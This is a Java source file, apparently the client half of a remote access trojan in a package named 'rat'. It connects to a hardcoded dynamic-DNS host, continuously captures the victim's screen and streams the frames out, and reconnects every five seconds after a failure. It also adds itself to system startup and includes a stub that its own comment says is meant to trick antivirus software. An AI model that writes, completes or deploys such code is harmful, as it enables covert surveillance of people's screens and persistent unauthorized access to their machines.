package rat;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
import java.nio.file.Paths;
import java.util.stream.Stream;

import javax.swing.JOptionPane;

public class Server {

	Socket serSocket;
	ObjectOutputStream os;
	InputStream is;
	int screenWidth;
	int screenHeight;
	static boolean exception = true;
	static String address;

	public Server() throws UnknownHostException, IOException {
		address = "td1234.duckdns.org";
		serSocket = new Socket(address, 1300);
		os = new ObjectOutputStream(serSocket.getOutputStream());
		is = serSocket.getInputStream();
		final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		screenHeight = screenSize.height;
		screenWidth = screenSize.width;

		Runnable sendStream = () -> {

			BufferedImage oldimg = null;
			BufferedImage newimg = Frame.captureScreen();
			Frame[] frames;
			while (true) {
				System.gc();
				try {

					newimg = Frame.captureScreen();

					if (oldimg == null) {
						frames = new Frame[1];
						frames[0] = new Frame(0, 0, newimg);
					} else {
						frames = Frame.getIFrames(oldimg, newimg);
					}

					Stream.of(frames).forEach(frame -> {
						final byte[] data = Frame.toByteArray(frame.image, 0);
						try {
							os.writeByte(Frame.INCOMING);
							os.writeShort((short) frame.x);
							os.writeShort((short) frame.y);
							os.writeInt(data.length);
							os.write(data);
						} catch (IOException e) {
							exception = true;
							try {
								startServer();
							} catch (InterruptedException e1) {
							}
							return;
						}
					});

					os.writeByte(Frame.END);
					os.writeInt(screenWidth);
					os.writeInt(screenHeight);

					oldimg = newimg;
					/*// TODO will see if needed
					try {
						Thread.currentThread().sleep(5);
					} catch (Exception e) {
						exception = true;
						startServer();
						return;
					}*/
				} catch (Exception ex) {
					exception = true;
					try {
						startServer();
					} catch (InterruptedException e) {
					}
					return;
				}
				System.gc();
			}

		};

		Thread sendStreamThread = new Thread(sendStream);
		sendStreamThread.run();

	}

	public static void startServer() throws InterruptedException {
		while (exception) {
			try {
				System.gc();
				new Server();
				exception = false;
			} catch (Exception e) {
				exception = true;
				Thread.sleep(5000);
			}
		}
	}

	public static void doRandomStuff() {
		/*
		 * This helps to trick some AV systems. Just in case. Hopefully those
		 * expressions generate NOP assembly commands.
		 */

		;

		System.out.println();

		{
			;
			;
			;
		}

		System.out.println();

		;
	}

	public static void main(String args[]) throws InterruptedException, URISyntaxException, IOException {
		// TODO
		// System.out.println(Server.class.getProtectionDomain().getCodeSource().getLocation().toURI());
		// TODO compile code(in bin file): jar cvfe program.jar rat.Server -C .
		// .
		Utils.addToStartup(Paths.get(Server.class.getProtectionDomain().getCodeSource().getLocation().toURI()));
		//doRandomStuff();
		//address = JOptionPane.showInputDialog(null, "Server Address", "127.0.0.1");
		startServer();

	}

}
